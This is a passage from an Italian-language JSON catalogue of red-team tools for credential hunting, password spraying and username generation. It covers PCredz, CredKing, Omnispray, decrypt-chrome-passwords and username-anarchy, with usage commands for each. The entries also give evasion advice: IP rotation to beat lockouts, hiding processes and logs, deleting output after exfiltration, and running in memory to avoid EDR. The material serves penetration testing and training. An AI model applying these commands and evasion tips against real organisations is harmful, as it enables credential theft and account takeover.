ridurre la visibilità. Cancellare i log dopo l'estrazione dei dati utili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "pcredz",
    "name": "PCredz",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/lgandx/PCredz",
    "desc": "Sniffer passivo che estrae credenziali (NTLM, HTTP Basic, FTP, POP3, SMTP, SNMP) e hash dal traffico di rete o file pcap.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PCredz</strong> è uno sniffer di rete passivo sviluppato da lgandx (lo stesso autore di Responder) specializzato nell'estrazione automatica di credenziali dal traffico di rete. A differenza di Responder che opera attivamente (poisoning LLMNR/NBT-NS), PCredz si limita ad ascoltare silenziosamente il traffico in transito senza iniettare pacchetti o rispondere a richieste, rendendolo virtualmente invisibile sulla rete. Analizza i pacchetti in tempo reale da un'interfaccia di rete in modalità promiscua oppure elabora file pcap catturati precedentemente. Lo script è scritto in Python e utilizza la libreria libpcap per l'accesso a basso livello ai pacchetti, garantendo prestazioni elevate anche su interfacce ad alto throughput.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Credential Extraction Multi-Protocollo:</strong> PCredz supporta l'estrazione di credenziali da oltre 15 protocolli di autenticazione. Per i protocolli in chiaro (HTTP Basic Auth, FTP, POP3, IMAP, SMTP, Telnet, LDAP, SNMP v1/v2 community strings), estrae direttamente username e password. Per i protocolli challenge-response, cattura hash NTLMv1 e NTLMv2 da sessioni SMB, HTTP NTLM e LDAP, formattandoli automaticamente nel formato corretto per Hashcat (<code>-m 5600</code> per NTLMv2) o John the Ripper.</p><p><strong>Kerberos & Credit Card Detection:</strong> Oltre alle credenziali standard, PCredz è in grado di estrarre ticket Kerberos AS-REQ e TGS-REP dal traffico, utili per attacchi di tipo Kerberoasting offline. Include anche pattern regex per identificare numeri di carte di credito (Visa, MasterCard, AMEX) che transitano in chiaro sulla rete, una funzionalità rilevante per audit PCI-DSS in ambienti retail o payment processing.</p><p><strong>Session Logging Persistente:</strong> Tutte le credenziali catturate vengono automaticamente salvate nel file <code>CredentialDump-Session.log</code> con timestamp, IP sorgente/destinazione e protocollo. Il file è strutturato per essere facilmente parsato da script di post-processing. PCredz evita automaticamente i duplicati, mostrando solo credenziali uniche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>PCredz richiede privilegi root per accedere all'interfaccia di rete in modalità promiscua. Dipende da Python 2/3 e dalla libreria libpcap (installata di default su Kali Linux). L'esecuzione è immediata senza configurazione.</p><pre><code># Sniffing live su interfaccia di rete\nsudo python3 Pcredz -i eth0\n\n# Analisi di un file pcap registrato\npython3 Pcredz -f capture.pcap\n\n# Analisi di tutti i pcap in una directory\npython3 Pcredz -d /path/to/pcap_directory/\n\n# Sniffing con output verbose\nsudo python3 Pcredz -i eth0 -v</code></pre><p>I risultati vengono mostrati a terminale in tempo reale e salvati automaticamente su file. Per deployment a lungo termine, combinare con <code>screen</code> o <code>tmux</code> per mantenere l'esecuzione dopo la disconnessione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Internal Network Assessment</strong>, PCredz viene lasciato in esecuzione su un dispositivo compromesso (server, workstation o Raspberry Pi \"dropbox\") per raccogliere passivamente credenziali nel tempo. In reti aziendali con servizi legacy, è comune trovare traffico FTP, HTTP Basic Auth, SNMP v1/v2 e Telnet in chiaro, specialmente verso stampanti, switch, sistemi SCADA e applicazioni interne non aggiornate.</p><p>Durante operazioni di <strong>Red Teaming</strong>, PCredz è preferito a Responder quando la priorità è la discrezione: non genera traffico anomalo, non risponde a broadcast e non altera il funzionamento della rete. Le credenziali NTLMv2 catturate passivamente dal traffico SMB possono essere crackate offline senza mai aver interagito attivamente con la vittima.</p><p>Per la <strong>Network Forensics</strong>, l'analisi di pcap catturati durante un incidente permette di identificare quali credenziali sono state esposte durante una compromissione, supportando la valutazione dell'impatto e le azioni di remediation (reset password).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'operazione è completamente passiva: nessun pacchetto viene inviato sulla rete, nessun servizio viene esposto e nessuna risposta viene generata. L'unico indicatore locale è la modalità promiscua dell'interfaccia di rete, che può essere rilevata da tool di monitoraggio del sistema operativo o da agenti EDR. Su reti switched, il traffico visibile è limitato al traffico broadcast e al traffico diretto alla porta dello switch corrente.</p><p><strong>Impatto operativo:</strong> Nessun impatto sulla rete o sui servizi. Il tool non modifica pacchetti né interferisce con le connessioni in corso. Il consumo di risorse è minimo anche su interfacce ad alto throughput.</p><p><strong>Mitigazioni:</strong> Per massimizzare la cattura su reti switched, combinare con ARP spoofing mirato (Bettercap) o richiedere port mirroring sullo switch (se si ha accesso amministrativo). Proteggere il file <code>CredentialDump-Session.log</code> con permessi restrittivi poiché contiene credenziali in chiaro. Per deployment discreto a lungo termine, rinominare il processo e nascondere i file di log.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "credking",
    "name": "CredKing",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ustayready/CredKing",
    "desc": "Framework di password spraying che utilizza AWS Lambda (FireProx) per rotazione IP e evasione intelligente del blocco account.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>CredKing</strong> porta il password spraying a un livello superiore integrando tecniche di evasione IP avanzate. Utilizza AWS API Gateway e Lambda (tramite FireProx) per ruotare l'indirizzo IP sorgente ad ogni richiesta, rendendo inutile il blocco IP da parte dei difensori. Supporta plugin per target multipli come Office 365, Okta, Gmail e SMB, gestendo automaticamente le finestre di lockout.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>IP Rotation (FireProx):</strong> La caratteristica distintiva. Invece di attaccare dal tuo IP (che verrebbe bannato), CredKing lancia le richieste attraverso infrastruttura cloud effimera, apparendo come traffico legittimo AWS diverso ad ogni tentativo.</p><p><strong>Plugin Modulari:</strong> Architettura estensibile per aggiungere nuovi target di login (es. portali VPN proprietari, app web custom).</p><p><strong>Smart Spraying:</strong> Algoritmi per distribuire i tentativi nel tempo e tra gli utenti, minimizzando la probabilità di triggerare soglie di allarme comportamentale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede configurazione AWS e credenziali. Esecuzione via Python.</p><pre><code># Spraying su O365 con rotazione IP\npython3 credking.py --plugin o365 --userfile users.txt --password \"Password123!\" --threads 5\n\n# Spraying su Okta\npython3 credking.py --plugin okta --target https://corp.okta.com --userfile users.txt --password \"Welcome1\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Indispensabile per <strong>Red Teaming</strong> contro target maturi che implementano Geo-blocking o IP-based rate limiting. Quando un attacco Hydra standard fallisce dopo 3 tentativi per ban IP, CredKing continua imperterrito. Efficace per testare la robustezza delle policy di password esterne.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene l'IP cambi, il pattern di \"molti login falliti su molti account\" è comunque visibile nei log applicativi del target. L'User-Agent potrebbe necessitare di tuning.</p><p><strong>Impatto operativo:</strong> Basso rischio tecnico, ma alto rischio di rilevamento procedurale.</p><p><strong>Mitigazioni:</strong> Usare password molto comuni per massimizzare il successo al primo tentativo. Monitorare attentamente le risposte per fermarsi se il target implementa CAPTCHA.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "decrypt-chrome-passwords-main",
    "name": "decrypt-chrome-passwords",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ohyicong/decrypt-chrome-passwords",
    "desc": "Tool specializzato per estrarre e decifrare credenziali salvate nel database SQLite di Google Chrome (Login Data) via DPAPI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Decrypt Chrome Passwords</strong> è uno script Python specializzato nell'estrazione e decifratura delle credenziali salvate nel password manager integrato di Google Chrome e browser basati su Chromium (Edge, Brave, Opera, Vivaldi). Chrome memorizza le password in un database SQLite locale chiamato <code>Login Data</code>, con le password cifrate usando AES-256-GCM a partire dalla versione 80. La chiave di cifratura è a sua volta protetta tramite DPAPI (Data Protection API) di Windows, legata al profilo utente corrente. Questo tool automatizza l'intero processo: localizza i file necessari, estrae la chiave master dal file <code>Local State</code>, la decifra via DPAPI e la usa per decifrare tutte le password salvate. È più leggero e mirato rispetto a suite complete come LaZagne, ideale per scenari dove si necessita un tool single-purpose con dipendenze minime.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Estrazione Master Key via DPAPI:</strong> A partire da Chrome v80, le password sono cifrate con AES-256-GCM usando una chiave derivata memorizzata nel file <code>Local State</code> (JSON). Questa chiave è protetta da DPAPI (CryptProtectData) ed è legata al profilo utente Windows corrente. Lo script la estrae e la decifra chiamando <code>CryptUnprotectData</code>, operazione possibile solo nel contesto dell'utente proprietario del profilo Chrome.</p><p><strong>Database SQLite Parsing:</strong> Legge il database <code>Login Data</code> estraendo per ogni entry: URL di origine (<code>origin_url</code>), URL di azione del form, username e blob cifrato della password. Gestisce automaticamente le differenze di schema tra versioni diverse di Chrome e supporta profili multipli (Default, Profile 1, Profile 2, ecc.).</p><p><strong>Multi-Browser Chromium Support:</strong> Oltre a Chrome, lo script può essere adattato per estrarre credenziali da qualsiasi browser basato su Chromium che utilizza la stessa struttura di storage: Microsoft Edge, Brave, Opera, Vivaldi e altri. I percorsi dei profili differiscono ma la struttura del database e il metodo di cifratura sono identici.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo script deve essere eseguito sulla macchina target, nel contesto dell'utente proprietario del profilo Chrome (o con token impersonato). Richiede Python 3 con i moduli <code>pycryptodome</code> e <code>pywin32</code>. Chrome dovrebbe essere chiuso per evitare lock sul database SQLite.</p><pre><code># Esecuzione standard (estrae dal profilo Chrome default)\npython3 decrypt_chrome_passwords.py\n\n# Esecuzione con output su file CSV\npython3 decrypt_chrome_passwords.py > credentials.csv\n\n# Se Chrome è aperto, copiare prima il database\ncopy \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" C:\\temp\\LoginData\npython3 decrypt_chrome_passwords.py --db C:\\temp\\LoginData</code></pre><p>Se l'esecuzione fallisce per lock del database, è sufficiente copiare il file <code>Login Data</code> in una directory temporanea prima dell'analisi. Il file <code>Local State</code> non è soggetto a lock.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Post-Exploitation su Workstation</strong>, l'estrazione delle password Chrome è una delle prime azioni dopo aver ottenuto accesso a un PC aziendale. Le credenziali salvate nel browser includono tipicamente accessi a portali interni, servizi cloud (O365, AWS Console, Google Workspace), VPN SSL, pannelli di gestione e social media, fornendo un tesoro di informazioni per il movimento laterale e l'escalation.</p><p>Per l'<strong>Automated Credential Harvesting</strong>, lo script può essere integrato in payload post-exploitation (Cobalt Strike BOF, Meterpreter script, USB Rubber Ducky) per esfiltrare rapidamente le credenziali senza interazione manuale. La leggerezza del tool e le poche dipendenze lo rendono ideale per questo scopo.</p><p>Durante <strong>Incident Response</strong>, i team forensi utilizzano tool simili per verificare quali credenziali sono state potenzialmente compromesse su workstation infette, supportando le decisioni di reset password e le notifiche agli utenti impattati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'accesso programmatico ai file <code>Login Data</code> e <code>Local State</code> è monitorato da soluzioni EDR moderne (CrowdStrike, SentinelOne, Defender for Endpoint) che hanno regole specifiche per il credential theft dal browser. La chiamata a <code>CryptUnprotectData</code> può essere hookata e loggata. Alcuni antivirus classificano lo script stesso come hacktool.</p><p><strong>Impatto operativo:</strong> Se Chrome è aperto, il database SQLite è in lock e l'accesso diretto fallirà. La copia del file risolve il problema ma lascia un artefatto su disco. Lo script non modifica il profilo Chrome e l'utente non noterà anomalie.</p><p><strong>Mitigazioni:</strong> Copiare i file del database in una directory temporanea prima dell'estrazione per evitare lock ed errori. Eseguire lo script in memoria se possibile (tramite execute-assembly o reflective loading). Cancellare immediatamente il file di output dopo l'esfiltrazione. Per ridurre la detection EDR, considerare l'uso di API DPAPI manuali invece della libreria pywin32.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "htb-wordlist",
    "name": "HTB-wordlist",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Wordlist curata specificamente per le challenge HackTheBox: directory, file e credenziali ricorrenti nei lab CTF.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HTB-wordlist</strong> è una raccolta curata di dizionari ottimizzati per le challenge della piattaforma HackTheBox e CTF simili. Non è un singolo file ma un insieme di liste specializzate che la community ha identificato come essenziali per risolvere le macchine della piattaforma in modo efficiente. Queste wordlist includono percorsi web, nomi di file, password, username e virtual host che appaiono frequentemente nei laboratori CTF, ottimizzando drasticamente i tempi di bruteforce rispetto a liste generiche come <code>directory-list-2.3-medium.txt</code> (220.000+ entry) o <code>rockyou.txt</code> (14 milioni+ entry). L'obiettivo è massimizzare l'hit rate con il minimo numero di tentativi, riducendo il tempo di scansione da minuti a secondi.</p><br><hr><h4 class=\"rt-purple\">Componenti principali</h4><p><strong>Directory & File Lists:</strong> Contengono percorsi web e nomi di file specifici per ambienti CTF: cartelle nascoste tipiche (<code>/secret/</code>, <code>/internal/</code>, <code>/dev/</code>), file di backup (<code>.bak</code>, <code>.old</code>, <code>.swp</code>), file di configurazione esposti e percorsi di applicazioni web comunemente utilizzate come target nelle challenge. Le liste sono pulite da entry ridondanti e arricchite con termini \"Easter egg\" che i creatori di challenge amano nascondere.</p><p><strong>Password & Credential Lists:</strong> Dizionari di password calibrati sulle challenge HTB, che spesso utilizzano password deboli specifiche, credenziali di default di servizi e applicazioni, e password tematiche legate alla storia o al nome della macchina. Include anche combinazioni username:password comuni per servizi come SSH, FTP, MySQL e applicazioni web.</p><p><strong>Subdomain & VHost Lists:</strong> Liste di virtual host e sottodomini ottimizzate per le challenge HTB che frequentemente richiedono la scoperta di vhost nascosti. Contengono termini corti e specifici che coprono i pattern più comuni utilizzati dai creatori di macchine senza la pesantezza di liste generiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Le wordlist HTB si usano come input per tool di bruteforcing e fuzzing. Sono progettate per essere il primo tentativo prima di passare a liste più grandi. La dimensione ridotta permette scansioni rapide anche con tool meno performanti.</p><pre><code># Directory busting rapido su macchina HTB\ngobuster dir -u http://10.10.10.x -w htb-directories.txt -t 50\n\n# Fuzzing vhost per scoprire sottodomini\nffuf -u http://10.10.10.x -H \"Host: FUZZ.box.htb\" -w htb-subdomains.txt -fc 302\n\n# Password bruteforce SSH con lista HTB\nhydra -L htb-users.txt -P htb-passwords.txt ssh://10.10.10.x\n\n# Content discovery con estensioni multiple\nferoxbuster -u http://10.10.10.x -w htb-web.txt -x php,txt,html,bak</code></pre><p>È buona pratica iniziare con le liste HTB per ottenere risultati rapidi, e solo se non si trova nulla passare a dizionari più grandi come quelli di SecLists.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In contesto <strong>CTF e Training</strong>, queste wordlist sono lo strumento primario per risolvere le macchine HackTheBox, TryHackMe e piattaforme simili in modo efficiente. L'alto hit rate permette di concentrarsi sulla parte creativa della challenge piuttosto che aspettare scansioni interminabili.</p><p>Per il <strong>Learning e Skill Development</strong>, usare liste ottimizzate aiuta i principianti a capire quali pattern cercare durante il content discovery, costruendo progressivamente la propria intuizione su quali file e directory sono più probabili in diversi scenari.</p><p>Come <strong>Base di Partenza per Assessment Reali</strong>, le liste HTB possono servire come primo passaggio rapido prima di usare dizionari enterprise più completi. Tuttavia, non devono essere l'unica risorsa poiché mancano di copertura per software aziendale specifico e applicazioni enterprise.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Le wordlist HTB sono ottimizzate per ambienti CTF intenzionalmente vulnerabili e possono contenere termini specifici (\"CTF-isms\") poco rilevanti in pentest reali. Non sostituiscono liste enterprise come SecLists, FuzzDB o dizionari personalizzati per il target specifico.</p><p><strong>Aggiornamento:</strong> Le liste devono essere aggiornate periodicamente per riflettere le nuove macchine e i pattern emergenti nella piattaforma. I creatori di challenge evolvono costantemente le tecniche, rendendo obsolete le liste più vecchie.</p><p><strong>Integrazione:</strong> Per massimizzare l'efficacia, combinare le liste HTB con dizionari generati dinamicamente dal sito target (tramite CeWL) e con wordlist di SecLists per una copertura completa.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "omnispray",
    "name": "Omnispray",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/0xZDH/Omnispray",
    "desc": "Tool modulare per password spraying con gestione avanzata di target multipli, delay randomizzato e output strutturato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Omnispray</strong> è un framework modulare per password spraying scritto in Python, progettato per gestire attacchi di credential testing su larga scala contro servizi di autenticazione multipli. A differenza di script one-off o tool specifici per un singolo servizio, Omnispray offre un'architettura a plugin che supporta diversi protocolli e piattaforme (O365, OWA, ADFS, SSH, ecc.) con un'interfaccia unificata. Il tool integra meccanismi di sicurezza avanzati per evitare lockout degli account e ridurre il rischio di rilevamento: jitter randomizzato tra le richieste, limiti configurabili di errori consecutivi, e logging granulare di ogni tentativo. È particolarmente utile in engagement che richiedono lo spraying su più servizi dello stesso target con la stessa lista di utenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Architettura Modulare:</strong> Omnispray supporta moduli intercambiabili per diversi servizi di autenticazione. Ogni modulo implementa la logica specifica per interagire con il protocollo target (HTTP forms per OWA, OAuth per O365, SSH protocol per server Linux). Questo design permette di aggiungere nuovi target senza modificare il core del framework, e di riutilizzare la stessa configurazione (utenti, password, timing) su servizi diversi.</p><p><strong>Safety Controls Anti-Lockout:</strong> Il tool implementa meccanismi di protezione fondamentali per evitare il blocco massivo degli account. Il jitter (delay randomizzato) tra le richieste mimetizza il traffico nel pattern di login normale. Il sistema di stop automatico interrompe lo spraying quando rileva troppi errori consecutivi o risposte anomale dal server (rate limiting, CAPTCHA). È possibile configurare il numero massimo di tentativi per utente e l'intervallo di attesa tra password diverse.</p><p><strong>Reporting e State Management:</strong> Genera log strutturati e file CSV con le credenziali valide scoperte, lo stato di ogni tentativo (successo, fallito, lockout, errore) e statistiche aggregate. Supporta il resume delle sessioni interrotte, riprendendo esattamente dal punto di interruzione senza ripetere tentativi già effettuati. Questo è essenziale per spraying distribuiti su più giorni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Omnispray richiede Python 3 e le dipendenze specifiche del modulo target. La configurazione avviene tramite parametri CLI o file di configurazione YAML per scenari complessi. I moduli disponibili variano in base alla versione.</p><pre><code># Password spraying su Outlook Web Access (OWA)\npython3 omnispray.py --module owa --target https://mail.corp.com --users users.txt --password \"Estate2024!\"\n\n# Spraying su O365 con delay randomizzato e jitter\npython3 omnispray.py --module o365 --target corp.com --users users.txt --password \"Welcome1!\" --delay 30 --jitter 10\n\n# Spraying su SSH con lista password e rate limiting\npython3 omnispray.py --module ssh --target 10.0.0.50 --users admins.txt --passwords common_pass.txt --delay 60 --lockout 3\n\n# Resume di una sessione interrotta\npython3 omnispray.py --module owa --target https://mail.corp.com --resume session_2024.json</code></pre><p>Per spraying su O365, è fondamentale verificare prima il tipo di autenticazione del tenant (Managed vs Federated) poiché i moduli e gli endpoint differiscono significativamente.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>External Penetration Test</strong>, Omnispray è utilizzato per testare le credenziali contro servizi perimetrali (VPN SSL, OWA, Citrix, O365) con una singola password comune per ciclo. La scoperta di anche un solo account valido apre l'accesso alla rete interna o alle risorse cloud dell'organizzazione.</p><p>Durante il <strong>Red Teaming</strong>, il framework permette di gestire campagne di spraying distribuite nel tempo (una password al giorno per settimane), mimetizzando l'attività nel volume normale di login falliti degli utenti legittimi. La funzione di resume è fondamentale per queste campagne a lungo termine.</p><p>Per il <strong>Security Audit delle Password</strong>, i team di sicurezza interni utilizzano Omnispray per verificare periodicamente che i dipendenti non usino password deboli o stagionali, testando le top 10 password più comuni contro l'intera base utenti e identificando gli account non conformi alla policy.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Anche con jitter e delay, il volume di login falliti da un singolo IP sorgente è rilevabile da SIEM con regole di correlazione (N tentativi falliti in M minuti). Azure AD e O365 hanno protezioni integrate come Smart Lockout che rilevano pattern di spraying. Le soluzioni CASB (Cloud Access Security Broker) monitorano specificamente questo tipo di attività.</p><p><strong>Impatto operativo:</strong> Un spraying mal configurato può causare il blocco massivo degli account utente, con impatto diretto sulla produttività aziendale. Su O365 con Smart Lockout abilitato, gli account vengono bloccati temporaneamente dopo pochi tentativi falliti dallo stesso IP.</p><p><strong>Mitigazioni:</strong> Combinare con proxy rotation (FireProx, AWS API Gateway) per distribuire le richieste su IP diversi. Limitare lo spraying a una password per ciclo con attesa di almeno 30-60 minuti tra cicli. Verificare la policy di lockout del target prima di iniziare. Per O365, usare moduli che sfruttano endpoint meno monitorati come ActiveSync o EWS.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "statistically-likely-usernames",
    "name": "statistically-likely-usernames",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/insidetrust/statistically-likely-usernames",
    "desc": "Generatore di wordlist username basato su dati di censimento e pattern aziendali (nome.cognome, iniziali) per password spraying efficace.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Non è un software, ma una risorsa/metodologia per generare liste di username ad alta probabilità. Sfrutta dataset pubblici (nomi e cognomi più diffusi per nazionalità) e li combina con formati username standard (es. <code>m.rossi</code>, <code>mario.rossi</code>, <code>rossim</code>). Questo approccio statistico aumenta drasticamente il successo del password spraying e dell'enumerazione utenti riducendo il numero di richieste inutili verso account inesistenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dataset Reali:</strong> Include liste di nomi maschili/femminili e cognomi basati su dati di censimento USA, UK, e altri paesi, ordinati per frequenza.</p><p><strong>Pattern Generation:</strong> Script o logiche per permutare nomi e cognomi nei formati più usati dalle aziende (jsmith, john.s, smithj, ecc.).</p><p><strong>Efficienza:</strong> Permette di colpire il \"top 5%\" degli utenti probabili (es. i 100 cognomi più comuni coprono una grossa fetta della popolazione), ottimizzando il tempo di attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si usa offline per preparare la lista target prima dell'attacco.</p><pre><code># Generazione lista username (esempio concettuale con tool di supporto)\n./generate-usernames.sh --format first.last --top 1000 > targets.txt\n\n# Uso con Kerbrute\nkerbrute userenum -d domain.local targets.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Fondamentale in fasi di <strong>Recon Black-Box</strong> esterna quando non si hanno liste dipendenti. Combinato con LinkedIn scraping (per trovare i nomi reali), questo tool aiuta a indovinare il formato username aziendale (es. testando 10 dipendenti noti) e poi generare una lista massiva per l'intera azienda.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>L'accuratezza dipende dalla nazionalità del target. Usare liste anglosassoni su un'azienda italiana produrrà risultati scarsi. Necessita di localizzazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "username-anarchy-0-6",
    "name": "username-anarchy",
    "version": "0.6",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/urbanadventurer/username-anarchy",
    "desc": "Tool per generare liste di username basate su nomi reali, permutando formati comuni (j.doe, doe.j) per attacchi mirati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Username Anarchy</strong> è un tool scritto in Ruby che genera liste di username probabili partendo da nomi e cognomi reali. Risolve un problema fondamentale nella fase di ricognizione: conoscere i nomi dei dipendenti (tramite LinkedIn, sito aziendale, OSINT) non è sufficiente per un attacco, è necessario conoscere il formato degli username utilizzati dall'organizzazione (es. <code>mario.rossi</code>, <code>m.rossi</code>, <code>mrossi</code>, <code>rossim</code>). Username Anarchy genera automaticamente tutte le permutazioni standard utilizzate dalle aziende, producendo liste ottimizzate per password spraying, phishing e enumerazione. Supporta oltre 15 formati di username predefiniti e gestisce correttamente caratteri speciali, nomi composti e traslitterazioni internazionali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Permutazione Multi-Formato:</strong> Genera username in decine di formati comuni: <code>first.last</code>, <code>flast</code>, <code>f.last</code>, <code>lastf</code>, <code>last.first</code>, <code>first_last</code>, <code>firstlast</code> e molti altri. Ogni nome in input produce 10-20+ varianti, coprendo la maggior parte delle convenzioni aziendali. Supporta anche formati regionali specifici (es. formato email italiano <code>nome.cognome@</code>).</p><p><strong>Format Recognition & Auto-Detection:</strong> Se si conoscono già alcuni username validi dell'organizzazione (es. dal footer delle email, da LinkedIn, da leak precedenti), Username Anarchy può dedurre il formato utilizzato e generare gli username rimanenti esclusivamente in quel formato. Questo riduce drasticamente la dimensione della lista e aumenta il rapporto segnale/rumore.</p><p><strong>Gestione Caratteri Internazionali:</strong> Gestisce correttamente nomi con caratteri accentati, diacritici e non-ASCII, eseguendo traslitterazioni automatiche (es. <code>ö</code> → <code>o</code>, <code>ñ</code> → <code>n</code>, <code>ü</code> → <code>u</code>). Questo è fondamentale per target internazionali dove i sistemi IT spesso normalizzano i caratteri speciali negli username.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Username Anarchy è uno script Ruby che accetta nomi da riga di comando o da file di input. Il file di input deve contenere un nome completo per riga (\"Nome Cognome\"). L'output viene stampato su stdout per essere rediretto su file o passato via pipe ad altri tool.</p><pre><code># Generazione di username da lista di nomi completi\n./username-anarchy -i fullnames.txt > userlist.txt\n\n# Generazione per un singolo nome in tutti i formati\n./username-anarchy Mario Rossi\n\n# Generazione solo in formato specifico\n./username-anarchy -f first.last -i fullnames.txt > userlist.txt\n\n# Auto-detection del formato da username noto\n./username-anarchy --recognised m.rossi -i fullnames.txt\n\n# Pipeline diretta con Kerbrute per enumerazione\n./username-anarchy -i nomi_linkedin.txt | kerbrute userenum -d corp.local --dc 10.0.0.1 -</code></pre><p>Il file di input può essere generato facilmente da profili LinkedIn usando tool come <code>linkedin2username</code> o manualmente dalla pagina \"Chi siamo\" del sito aziendale.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>OSINT to Operational Data</strong>, Username Anarchy è il ponte tra la ricognizione passiva (raccolta nomi da LinkedIn, sito web, conferenze) e l'azione operativa (spraying, phishing). Trasforma dati grezzi (nomi) in vettori di attacco concreti (username validi) in modo sistematico e completo.</p><p>Per il <strong>Password Spraying Preparation</strong>, generare una lista di username accurata è fondamentale per minimizzare i tentativi falliti. Con Username Anarchy si può prima generare tutte le varianti, poi validarle con Kerbrute (enumerazione via Kerberos) e infine usare solo gli username confermati per lo spraying, riducendo il rumore e il rischio di lockout.</p><p>Durante campagne di <strong>Social Engineering e Phishing</strong>, conoscere gli indirizzi email esatti è essenziale. Combinando i formati di username generati con il dominio aziendale (es. <code>m.rossi@corp.com</code>) si ottengono indirizzi email probabili per campagne di spear-phishing mirate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Username Anarchy è un tool completamente offline che non genera traffico di rete e non interagisce con il target. L'operazione avviene localmente sulla macchina dell'attaccante e non lascia tracce. L'impatto OPSEC è zero durante la generazione; il rischio si materializza solo quando la lista viene utilizzata con tool attivi come Kerbrute o spray tool.</p><p><strong>Impatto operativo:</strong> Nessun impatto diretto. Tuttavia, liste troppo grandi (es. 1000 nomi × 20 formati = 20.000 username) possono rallentare gli strumenti di attacco successivi e generare un volume eccessivo di tentativi falliti.</p><p><strong>Mitigazioni:</strong> Utilizzare la funzione di auto-detection del formato quando possibile per ridurre la lista ai soli formati rilevanti. Validare gli username con Kerbrute prima di procedere allo spraying. Combinare con OSINT mirata (analisi delle email reali trovate in breach o metadata dei documenti) per confermare il formato prima della generazione massiva.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "bashfuscator",
    "name": "Bashfuscator",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Bashfuscator/Bashfuscator",
    "desc": "Framework avanzato per offuscare script Bash rendendoli illeggibili e bypassando rilevamenti statici/signature-based.",
